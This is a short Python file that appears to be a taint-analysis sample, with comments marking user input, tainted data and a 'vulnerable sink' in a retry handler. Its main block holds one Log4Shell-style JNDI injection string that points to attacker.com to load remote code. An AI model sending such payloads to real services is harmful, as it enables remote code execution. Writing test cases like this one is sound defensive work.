# retry_prdocuer_handler.py

import json


class RetryProducerHandler:

    def __init__(self, event, submission_id):
        self.actual_event = event
        self.sunmission_id = submission_id

    def skip_retry(self, input, submission_id):
        print(f"Skipping retry for {submission_id}")
        return True

    def process(self, raw_event):
        # User-controlled input
        event_data = json.loads(raw_event)

        # Tainted data assignment
        self.actual_event = event_data.get("payload")

        # Vulnerable sink
        self.skip_retry(input=self.actual_event, submission_id=self.sunmission_id)


if __name__ == "__main__":
    malicious_input = '''
    {
        "payload": "${jndi:ldap://attacker.com/exploit}"
    }
    '''

    handler = RetryProducerHandler(
        event=None,
        submission_id="SUB-123"
    )

    handler.process(malicious_input)